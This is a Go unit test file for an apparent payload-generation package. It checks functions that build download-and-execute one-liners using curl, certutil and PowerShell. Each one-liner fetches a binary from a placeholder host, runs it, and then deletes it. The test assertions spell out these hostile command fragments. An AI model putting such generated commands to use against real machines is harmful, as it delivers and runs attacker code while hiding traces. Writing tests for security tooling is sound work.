package payload

import (
	"strings"
	"testing"
)

func TestLinuxCurlHTTPDownloadAndExecute(t *testing.T) {
	curlCommand := LinuxCurlHTTPDownloadAndExecute("127.0.0.1", 1270, false, "helloworld")

	if !strings.HasPrefix(curlCommand, "curl -so") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "http://") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "chmod +x") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "rm -f") {
		t.Fatal(curlCommand)
	}

	t.Log(curlCommand)
}

func TestLinuxCurlHTTPSDownloadAndExecute(t *testing.T) {
	curlCommand := LinuxCurlHTTPDownloadAndExecute("127.0.0.1", 1270, true, "helloworld")

	if !strings.HasPrefix(curlCommand, "curl -kso") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "https://") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "chmod +x") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "rm -f") {
		t.Fatal(curlCommand)
	}

	t.Log(curlCommand)
}

func TestWindowsCurlHTTPDownloadAndExecute(t *testing.T) {
	curlCommand := WindowsCurlHTTPDownloadAndExecute("127.0.0.1", 1270, false, "helloworld")

	if !strings.HasPrefix(curlCommand, "curl.exe -so") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "http://") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "del /f") {
		t.Fatal(curlCommand)
	}

	t.Log(curlCommand)
}

func TestWindowsCurlHTTPSDownloadAndExecute(t *testing.T) {
	curlCommand := WindowsCurlHTTPDownloadAndExecute("127.0.0.1", 1270, true, "helloworld")

	if !strings.HasPrefix(curlCommand, "curl.exe -kso") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "https://") {
		t.Fatal(curlCommand)
	}

	if !strings.Contains(curlCommand, "del /f") {
		t.Fatal(curlCommand)
	}

	t.Log(curlCommand)
}

func TestWindowsCertutilHTTPDownloadAndExecute(t *testing.T) {
	host := "127.0.0.1"
	port := 1270
	downloadFile := "helloworld"

	expected0 := `certutil.exe -urlcache -split -f http://127.0.0.1:1270/helloworld %TEMP%\`
	expected1 := `.exe && %TEMP%\`
	expected2 := `.exe & del /f %TEMP%\`

	t.Run("http", func(t *testing.T) {
		comm := WindowsCertutilHTTPDownloadAndExecute(host, port, false, downloadFile)

		if !strings.Contains(comm, expected0) {
			t.Fatal(comm)
		}
		if !strings.Contains(comm, expected1) {
			t.Fatal(comm)
		}
		if !strings.Contains(comm, expected2) {
			t.Fatal(comm)
		}

		t.Log(comm)
	})

	t.Run("https", func(t *testing.T) {
		comm := WindowsCertutilHTTPDownloadAndExecute(host, port, true, downloadFile)

		if !strings.Contains(comm, strings.Replace(expected0, "http://", "https://", 1)) {
			t.Fatal(comm)
		}
		if !strings.Contains(comm, expected1) {
			t.Fatal(comm)
		}
		if !strings.Contains(comm, expected2) {
			t.Fatal(comm)
		}

		t.Log(comm)
	})
}

func TestWindowsPowershellHTTPDownloadAndExecute(t *testing.T) {
	comm := WindowsPowershellHTTPDownloadAndExecute("127.0.0.1", 1270, false, "helloworld")

	if !strings.Contains(comm, "powershell -c") {
		t.Fatal(comm)
	}
	if !strings.Contains(comm, `'Invoke-WebRequest -Uri http://127.0.0.1:1270/helloworld -OutFile "$([System.IO.Path]::GetTempPath())`) {
		t.Fatal(comm)
	}
	if !strings.Contains(comm, `.exe"; "$([System.IO.Path]::GetTempPath()`) {
		t.Fatal(comm)
	}
	if !strings.Contains(comm, `.exe"; Remove-Item "$([System.IO.Path]::GetTempPath())`) {
		t.Fatal(comm)
	}

	t.Log(comm)
}
